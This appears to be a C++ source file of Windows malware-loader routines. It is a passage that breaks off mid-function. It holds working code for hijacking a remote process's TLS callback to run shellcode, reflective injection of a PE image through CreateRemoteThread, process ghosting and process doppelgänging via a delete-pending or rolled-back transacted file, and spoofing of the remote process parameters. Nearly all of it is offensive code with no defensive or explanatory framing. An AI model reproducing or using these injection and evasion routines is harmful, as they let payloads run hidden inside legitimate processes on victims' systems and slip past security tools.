DWORD GetProcessIDFromName(WCHAR* ProcName) {

    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD PID = -1;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return(FALSE);
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return -1;
    }
    do
    {
        if (wcscmp(pe32.szExeFile, ProcName) == 0) {
            PID = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    return PID;
}

BYTE* ReadDataFromFile(WCHAR* FileName) {

    HANDLE hFile = NULL; 
    BOOL bResult = FALSE;
    DWORD cbRead = 0;

    hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed To Open Handle To File %S Error Code is 0x%x\n", FileName, GetLastError());
        return NULL;
    }

    int FileSize = GetFileSize(hFile, 0);
    if (FileSize == INVALID_FILE_SIZE) {
        printf("Failed To get File size Error Code is 0x%x\n", GetLastError());
        return NULL;
    }

    BYTE* FileContents = new BYTE[FileSize];
    ZeroMemory(FileContents, FileSize);

    bResult = ReadFile(hFile, FileContents, FileSize, &cbRead, NULL);
    if (bResult == FALSE) {
        printf("Failed To Read File Data Error Code is 0x%x\n", GetLastError());
        return NULL;
    }

    CloseHandle(hFile);
    return FileContents;
}

DWORD GetSizeOfFile(WCHAR *FileName) {
    HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD FileSize = GetFileSize(hFile, 0);
    if (FileSize == INVALID_FILE_SIZE) {
        printf("Failed To get File size Error Code is 0x%x\n", GetLastError());
        return NULL;
    }

    CloseHandle(hFile);
    return FileSize;
}

BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo,DWORD CreationFlag) {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(si);


    if (CreateProcessW(NULL, ExecutablePath, NULL, NULL, FALSE, CreationFlag, NULL, NULL, &si, &pi) == FALSE) {
        printf("Failed to Create Process %S Error code is 0x%x\n", ExecutablePath, GetLastError());
        return NULL;
    }

    CloseHandle(pi.hProcess);
    ProcessInfo->MainThreadHandle = pi.hThread;
    ProcessInfo->PID = pi.dwProcessId;

    return 1;
}

void ResumeProcess(HANDLE hThread) {
    ResumeThread(hThread);
}

void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo)
{
    HANDLE hSnapShot;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID);
    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        printf("CreateToolhelp32Snapshot %x\n", GetLastError());
        //GetLastErrorBox(NULL, "Cannot create snapshot");
        return;
    }
    MODULEENTRY32 ModuleEntry32;
    ModuleEntry32.dwSize = sizeof(ModuleEntry32);
    if (Module32First(hSnapShot, &ModuleEntry32))
    {
        do
        {
            wchar_t* pwc;
            pwc = wcsstr(ModuleEntry32.szModule, L".exe");
            if (pwc) {
                printf("found  %p  %d \n", ModuleEntry32.modBaseAddr, ModuleEntry32.dwSize);
                ProcessInfo->MainModuleAddress = ModuleEntry32.modBaseAddr;
                ProcessInfo->MainModuleSize = ModuleEntry32.dwSize;
            }

        } while (Module32Next(hSnapShot, &ModuleEntry32));
    }
    CloseHandle(hSnapShot);
    return ;

}

int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo,BYTE* ShellCode,DWORD ShellCodeSize) {

    DWORD NumberOfElementToGetFromTLSArray = 15;;
    DWORD OldProtection = 0;
    DWORD Status = NULL;
    LPVOID ShelCodeAddress = NULL;
    SIZE_T written = NULL;

    
    BYTE* LocalCopyOfMainModule = new BYTE[ModuleInfo->MainModuleSize];
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    Status = ReadProcessMemory(hProcess, ModuleInfo->MainModuleAddress, LocalCopyOfMainModule, ModuleInfo->MainModuleSize, 0);

    ULONG size;
    PIMAGE_TLS_DIRECTORY32 TLSDirectory = (PIMAGE_TLS_DIRECTORY32)ImageDirectoryEntryToData(LocalCopyOfMainModule, TRUE, IMAGE_DIRECTORY_ENTRY_TLS, &size);
    if (TLSDirectory) {
        printf( "in before\n");
        printf("Base is %p\n", LocalCopyOfMainModule);
        printf("TLSDirectory  %p  \n", TLSDirectory);

        
        PIMAGE_TLS_DIRECTORY32 TLSConfig = new IMAGE_TLS_DIRECTORY32;
        ReadProcessMemory(hProcess, ((BYTE*)TLSDirectory - (BYTE*)LocalCopyOfMainModule) + ModuleInfo->MainModuleAddress, TLSConfig, sizeof(IMAGE_TLS_DIRECTORY32), 0);

        
        //Dumping the List of TLS CallBacks

        /*DWORD* TLSCallBackLocationArray = new DWORD[NumberOfElementToGetFromTLSArray];
        ReadProcessMemory(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks, TLSCallBackLocationArray, sizeof(DWORD), 0);
        for (int i = 0; i < NumberOfElementToGetFromTLSArray; i++) {
            printf("TLS Fun # %d is %p\n", i, TLSCallBackLocationArray[i]);
        }*/

        Status = VirtualProtectEx(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks,  sizeof(DWORD), PAGE_EXECUTE_READWRITE, &OldProtection);
        if (!Status) {
            printf("Failed to chang  Memory protection in process PID %d  Error Code is 0x%x\n", PID, GetLastError());
            return -1;
        }

        ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!ShelCodeAddress) {
            printf("Failed to Allocate Memory in process PID %d  Error Code is 0x%x\n", PID, GetLastError());
            return -1;
        }

        printf("the ShellCode Address at  %p\n", ShelCodeAddress);
        Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, &written);
        if (!Status) {
            printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
            return -1;
        }


        Status = WriteProcessMemory(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks, &ShelCodeAddress, sizeof(DWORD), &written);       
        if (!Status) {
            printf("Failed to write to memory %x\n", GetLastError());
            return -1;
        }

        Status = VirtualProtectEx(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks,  sizeof(DWORD), OldProtection, &OldProtection);
        if (!Status) {
            printf("Failed to chang  Memory protection Back To Original Value in process PID %d  Error Code is0x%x\n", PID, GetLastError());
        }

    }
    else {
        printf("No TLS CallBack in the Executable you Choose\n");
        return -1;
    }

    return 0;
}

PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase) {
    return (PIMAGE_NT_HEADERS)(dwImageBase + ((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
}

PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;

    PIMAGE_NT_HEADERS pNTHeaders = GetNTHeaders(dwImageBase);
    PLOADED_IMAGE pImage = new LOADED_IMAGE();

    pImage->FileHeader = (PIMAGE_NT_HEADERS)(dwImageBase + pDosHeader->e_lfanew);

    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;

    pImage->Sections = (PIMAGE_SECTION_HEADER)(dwImageBase + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    return pImage;
}

char* GetDLLName(DWORD64 dwImageBase,IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
{
    return (char*)(dwImageBase + ImageImportDescriptor.Name);
}

IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader)
{
    return pFileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
}

PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory)
{
    return (PIMAGE_IMPORT_DESCRIPTOR)(pFileHeader->OptionalHeader.ImageBase +
        ImportDirectory.VirtualAddress);
}

DWORD64 FindRemotePEB(HANDLE hProcess)
{
    HMODULE hNTDLL = LoadLibraryA("ntdll");

    if (!hNTDLL) {
        printf("Error Loading Library Error Code 0x%x\n", GetLastError());
        return -1;
    }

    FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");

    if (!fpNtQueryInformationProcess) {
        printf("Error Get NtQueryInformationProcess Address Error Code 0x%x\n", GetLastError());
        return -1;
    }

    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;

    PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();

    DWORD dwReturnLength = 0;

    ntQueryInformationProcess(hProcess, 0, pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);

    return (DWORD64)pBasicInfo->PebBaseAddress;
}

PEBmy* ReadRemotePEB(HANDLE hProcess)
{
    DWORD64 dwPEBAddress = FindRemotePEB(hProcess);

    PEBmy* pPEB = new PEBmy();
    size_t written = 0;

    BOOL bSuccess = ReadProcessMemory(hProcess, (LPCVOID)dwPEBAddress, (LPVOID)pPEB, sizeof(PEBmy), NULL);
    if (!bSuccess) {
        printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
        return NULL;
    }

    return pPEB;
}

PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
{
    BYTE* lpBuffer = new BYTE[BUFFER_SIZE];

    BOOL bSuccess = ReadProcessMemory(hProcess, lpImageBaseAddress, lpBuffer, BUFFER_SIZE, 0);
    if (!bSuccess) {
        printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
        return NULL;
    }

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;

    PLOADED_IMAGE pImage = new LOADED_IMAGE();

    pImage->FileHeader = (PIMAGE_NT_HEADERS)(lpBuffer + pDOSHeader->e_lfanew);

    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;

    pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    return pImage;
}

WORD GetPEFileArchitecture(BYTE* dwImageBase) {
    void* ptr = GetNTHeaders((DWORD64)dwImageBase);
    if (ptr == NULL) return 0;

    IMAGE_NT_HEADERS32* inh = static_cast<IMAGE_NT_HEADERS32*>(ptr);
    return inh->FileHeader.Machine;
}

DWORD GetEntryPointRVA(BYTE* dwImageBase) {

    WORD PEArch = GetPEFileArchitecture(dwImageBase);
    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)dwImageBase);
    if (pSourceHeaders == NULL) {
        return 0;
    }
    DWORD EntryPointRVA = 0;

    if (PEArch == IMAGE_FILE_MACHINE_AMD64) {
        IMAGE_NT_HEADERS64* PayLoadNTheader64 = (IMAGE_NT_HEADERS64*)pSourceHeaders;
        EntryPointRVA = PayLoadNTheader64->OptionalHeader.AddressOfEntryPoint;
    }
    else {
        IMAGE_NT_HEADERS32* PayLoadNTheader32 = (IMAGE_NT_HEADERS32*)pSourceHeaders;
        EntryPointRVA = static_cast<ULONGLONG>(PayLoadNTheader32->OptionalHeader.AddressOfEntryPoint);
    }

    return EntryPointRVA;
}

HANDLE OpenFileNtdll(WCHAR* FilePath)
{
    // convert to NT path
    std::wstring NtPath = L"\\??\\" + std::wstring(FilePath);

    UNICODE_STRING FileName = { 0 };
    RtlInitUnicodeString(&FileName, NtPath.c_str());

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &FileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK StatusBlock = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    NTSTATUS stat = NtOpenFile(&hFile, DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr, &StatusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(stat)) {
        printf("Failed To Create Target File Eror Code is %x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    return hFile;
}

HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _NtSetInformationFile fnNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(hNTDLL, "NtSetInformationFile");
    _NtWriteFile fnNtWriteFile = (_NtWriteFile)GetProcAddress(hNTDLL, "NtWriteFile");
    _NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");
    _NtClose fnNtClose = (_NtClose)GetProcAddress(hNTDLL, "NtClose");

    HANDLE hDelFile = OpenFileNtdll(filePath);
    if (!hDelFile || hDelFile == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK StatusBlock = { 0 };

    /* Set disposition flag */
    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    status = fnNtSetInformationFile(hDelFile, &StatusBlock, &info, sizeof(info), FILE_INFORMATION_CLASS(13));//FileDispositionInformation
    if (!NT_SUCCESS(status)) {
        printf("Failed to Setting information  Erro Code 0x%x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    LARGE_INTEGER ByteOffset = { 0 };

    status = fnNtWriteFile(hDelFile, NULL, NULL, NULL, &StatusBlock, payladBuf, payloadSize, &ByteOffset, NULL);
    if (!NT_SUCCESS(status)) {
        printf("Failed to Write Data To File Erro Code 0x%x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    status = fnNtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL, 0, PAGE_READONLY, SEC_IMAGE, hDelFile);
    if (status != 0) {
        printf("Failed to Create Section Erro Code 0x%x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    fnNtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}

WCHAR* GetFileNameFromPath(WCHAR* FullPath)
{
    size_t len = wcslen(FullPath);
    for (size_t i = len - 2; i >= 0; i--) {
        if (FullPath[i] == '\\' || FullPath[i] == '/') {
            return FullPath + (i + 1);
        }
    }
    return FullPath;
}

WCHAR* GetDirectoryFromPath(WCHAR* FullPath, WCHAR* OutBuffer, const DWORD64 OutBufferSize)
{
    memset(OutBuffer, 0, OutBufferSize);
    memcpy(OutBuffer, FullPath, OutBufferSize);

    wchar_t* name_ptr = GetFileNameFromPath(OutBuffer);
    if (name_ptr != nullptr) {
        *name_ptr = '\0'; //cut it
    }
    return OutBuffer;
}

BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath)
{
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _RtlCreateProcessParametersEx fnRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNTDLL, "RtlCreateProcessParametersEx");

    UNICODE_STRING uTargetPath = { 0 };
    RtlInitUnicodeString(&uTargetPath, targetPath);

    WCHAR DirPath[MAX_PATH] = { 0 };
    GetDirectoryFromPath(targetPath, DirPath, MAX_PATH);

    //if the directory is empty, set the current one
    if (wcsnlen(DirPath, MAX_PATH) == 0) {
        GetCurrentDirectoryW(MAX_PATH, DirPath);
    }

    UNICODE_STRING uCurrentDir = { 0 };
    RtlInitUnicodeString(&uCurrentDir, DirPath);

    WCHAR dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = { 0 };
    RtlInitUnicodeString(&uDllDir, dllDir);
    
    UNICODE_STRING uWindowName = { 0 };
    WCHAR windowName[] = L"Update";
    RtlInitUnicodeString(&uWindowName, windowName);

    LPVOID Environment;
    BOOL ret = CreateEnvironmentBlock(&Environment, NULL, TRUE);
    if (!ret) {
        printf("failed CreateEnvironmentBlock Error Code is %x\n", GetLastError());
        return -1;
    }

    PRTL_USER_PROCESS_PARAMETERSMy params = nullptr;

    NTSTATUS status = fnRtlCreateProcessParametersEx(&params, (PUNICODE_STRING)&uTargetPath, (PUNICODE_STRING)&uDllDir, (PUNICODE_STRING)&uCurrentDir, (PUNICODE_STRING)&uTargetPath, Environment,
                                                    (PUNICODE_STRING)&uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED);

    if (status != 0) {
        printf("failed RtlCreateProcessParametersEx Error Code 0x%x\n", GetLastError());
        return -1;
    }

    LPVOID RemoteParametar = WriteParameterinProcess(hProcess, params, PAGE_READWRITE);
    if (!RemoteParametar) {
        printf("failed Cannot make a remote copy of parameters Error Code 0x%x\n", GetLastError());
        return -1;
    }

    PEBmy* PebCopy = ReadRemotePEB(hProcess);

    if (!SetPEBparameter(RemoteParametar, hProcess, pi)) {
        printf("failed Cannot update Remote PEB Error Code 0x%x\n", GetLastError());
        return -1;
    }

    return 0;
}

LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect)
{
    if (params == NULL) return NULL;

    PVOID buffer = params;
    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

    //params and environment in one space:
    if (params->Environment) {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
            buffer = (PVOID)params->Environment;
        }
        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
        if (env_end > buffer_end) {
            buffer_end = env_end;
        }
    }
    // copy the continuous area containing parameters + environment
    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
    if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
            printf("failed Writing RemoteProcessParams Error Code 0x%x\n", GetLastError());
            return nullptr;
        }
        if (params->Environment) {
            if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
                printf("failed Writing environment Error Code 0x%x\n", GetLastError());
                return nullptr;
            }
        }
        return (LPVOID)params;
    }

    // could not copy the continuous space, try to fill it as separate chunks:
    if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        printf("failed Allocating RemoteProcessParams failed Error Code 0x%x\n", GetLastError());
        return nullptr;
    }
    if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
        printf("failed Writing RemoteProcessParams Error Code 0x%x\n", GetLastError());
        return nullptr;
    }
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            printf("failed Allocating environment Error Code 0x%x\n", GetLastError());
            return nullptr;
        }
        if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
            printf("failed Writing environment Error Code 0x%x\n", GetLastError());
            return nullptr;
        }
    }
    return (LPVOID)params;
}

BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi)
{
    ULONGLONG RemotePEBAddress = (ULONGLONG)pbi.PebBaseAddress;
    if (!RemotePEBAddress) {
        printf("failed getting remote PEB address Error Code 0x%x\n", GetLastError());
        return false;
    }
    PEB PEBCopy = { 0 };
    ULONGLONG offset = (ULONGLONG)&PEBCopy.ProcessParameters - (ULONGLONG)&PEBCopy;

    LPVOID RemoteImaegBase = (LPVOID)(RemotePEBAddress + offset);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, RemoteImaegBase, &ParametarBase, sizeof(PVOID), &written)) {
        printf("failed Cannot update Params Error Code 0x%x\n", GetLastError());
        return false;
    }

    return true;
}

DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter)
{
    BOOL bSuccess = FALSE;
    LPVOID lpRemoteLibraryBuffer = NULL;
    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
    HANDLE hThread = NULL;
    DWORD dwReflectiveLoaderOffset = 0;
    DWORD dwThreadId = 0;
    DWORD dwLength;

    if (!hProcess || !SourceFileData) {

        printf("invaild argument to LoadRemoteLibraryR\n");
        return -1;
    }


    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)SourceFileData);
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD64)SourceFileData);

    dwLength = pSourceHeaders->OptionalHeader.SizeOfImage;
    lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!lpRemoteLibraryBuffer) {

        printf("Failed To allocate Memory in remote Process Error Code is %x\n",GetLastError());
        return -1;
    }


    DWORD64 dwDelta = (DWORD64)lpRemoteLibraryBuffer - pSourceHeaders->OptionalHeader.ImageBase;

    pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)lpRemoteLibraryBuffer;

    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, SourceFileData, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
       
        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
        return -1;
    }

    for (DWORD64 x = 0; x < pSourceImage->NumberOfSections; x++)
    {
        if (!pSourceImage->Sections[x].PointerToRawData)
            continue;

        PVOID pSectionDestination = (PVOID)((DWORD64)lpRemoteLibraryBuffer + pSourceImage->Sections[x].VirtualAddress);

        if (!WriteProcessMemory(hProcess, pSectionDestination, &SourceFileData[pSourceImage->Sections[x].PointerToRawData], pSourceImage->Sections[x].SizeOfRawData, 0)) {
            printf("Failed writing process memory at address %p Error Code 0x%x\r\n", pSectionDestination, GetLastError());
            return -1;
        }
    }

    //Fixing the relocation in PE File
    if (dwDelta)
        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
        {
            char pSectionName[] = ".reloc";

            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
                continue;

            DWORD64 dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
            DWORD dwOffset = 0;

            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (dwOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&SourceFileData[dwRelocAddr + dwOffset];

                dwOffset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&SourceFileData[dwRelocAddr + dwOffset];

                for (DWORD y = 0; y < dwEntryCount; y++)
                {
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                    if (pBlocks[y].Type == 0)
                        continue;

                    DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

                    DWORD64 dwBuffer = 0;
                    BOOL bSuccess;
                    bSuccess = ReadProcessMemory(hProcess, (PVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress),&dwBuffer, sizeof(DWORD64), 0);
                    if (!bSuccess) {
                        printf("Failed reading memory at address %p  Erro code  0x%x\r\n", (PVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress), GetLastError());
                        return -1;
                    }

                    dwBuffer += dwDelta;
                    bSuccess = WriteProcessMemory(hProcess, (LPVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress), &dwBuffer, sizeof(DWORD64), 0);

                    if (!bSuccess) {
                        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", (LPVOID)((DWORD64)lpRemoteLibraryBuffer + dwFieldAddress, GetLastError()));
                        return -1;
                    }
                }
            }

            break;
        }



    //Resolve IAT API in remote Process
    //the Pe File Should depend only on kernel32 and ntdll.dll
    BYTE* RemoteDataBuffer = NULL;
    RemoteDataBuffer = new BYTE[dwLength];
    if (!RemoteDataBuffer) {
        printf("failed to allocate memory\n");
        return -1;
    }
    BOOL ret = ReadProcessMemory(hProcess, (PVOID)lpRemoteLibraryBuffer, RemoteDataBuffer, dwLength, 0);
    if (!ret) {
        printf("Failed reading memory at address %p  Erro code  0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
        return -1;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)RemoteDataBuffer);

    LPCSTR libraryName = "";
    HMODULE library = NULL;


    while (importDescriptor->Name != NULL)
    {

        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)RemoteDataBuffer;
        library = LoadLibraryA(libraryName);

        if (library)
        {

            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)RemoteDataBuffer + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData != NULL)
            {

                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)RemoteDataBuffer + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name); 
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }


    if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, RemoteDataBuffer, dwLength, 0))
    {
        printf("Failed writing process memory at address %p Error Code 0x%x\r\n", lpRemoteLibraryBuffer, GetLastError());
        return -1;
    }

    DWORD64 dwEntrypoint = (DWORD64)lpRemoteLibraryBuffer + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

    hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)dwEntrypoint, lpParameter, (DWORD)NULL, &dwThreadId);
    if (!hThread) {
        printf("failed to create remote thread Erro Code %x\n",GetLastError());
        return -1;
    }

    CloseHandle(hThread);
    
    return NULL;
}

HANDLE MakeTransactedSection(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize) {
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("Failed to create transaction! Error Code %x\n" ,GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hTransactedFile = CreateFileTransactedW(targetPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create transacted file Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        printf("Failed writing payload! Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status  = fnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
    if (status != 0) {
        printf("Failed NtCreateSection  Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        printf("Failed RollbackTransaction  Error Code %x\n ", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}


DWORD CreateProcessFromSecion(HANDLE hSection, BYTE* PayloadData, WCHAR* TargetProcessName) {

    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNTDLL, "NtCreateProcessEx");
    _NtCreateThreadEx fnNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    _NtQueryInformationProcess fnNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    HANDLE hThread = NULL;
    DWORD dwThreadId;
    DWORD param = NULL;

    HANDLE hProcess = nullptr;
